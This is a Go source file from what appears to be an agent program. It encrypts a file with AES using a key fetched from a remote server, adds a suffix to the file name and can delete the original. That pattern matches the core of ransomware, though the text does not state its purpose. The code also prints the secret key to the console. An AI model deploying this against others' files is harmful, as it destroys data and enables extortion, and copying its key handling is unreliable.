package operation

import (
	"crypto/aes"
	"crypto/md5"
	"crypto/cipher"
	"crypto/rand"
	"io"
	"io/ioutil"
	"encoding/hex"
	"os"
	"fmt"
	"blackbox/agent/cli"
	"blackbox/agent/connect"
)

func AesEncryptFile(filedata []byte, hash [16]byte, key []byte, opath string) error {
	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	cipherdata := make([]byte, md5.Size + aes.BlockSize + len(filedata))
	for i, c := range hash {
		cipherdata[i] = c
	}
	iv := cipherdata[md5.Size:md5.Size + aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return err
	}

	cfb := cipher.NewCFBEncrypter(block, iv)
	cfb.XORKeyStream(cipherdata[md5.Size + aes.BlockSize:], filedata)

	err = ioutil.WriteFile(opath, cipherdata, 0644)
	if err != nil {
		return err
	}
	return nil
}

func AesEncryptFileAuto(arg cli.Args, path string) error {
	filedata, err := ioutil.ReadFile(path)
	if err != nil {
		return err
	}
	hash := md5.Sum(filedata)
	fmt.Println("hash", hash)
	key, err := connect.RequestSecret(arg, hex.EncodeToString(hash[:]))
	if err != nil {
		return err
	}
	fmt.Println("key", key)
	opath := path + "." + arg.Suffix
	err = AesEncryptFile(filedata, hash, key, opath)
	if err != nil {
		return err
	}
	fmt.Println("Encrypted file saved to", opath)
	if arg.Remove {
		fmt.Println("Removing file:", path)
		err = os.Remove(path)
	}
	return err
}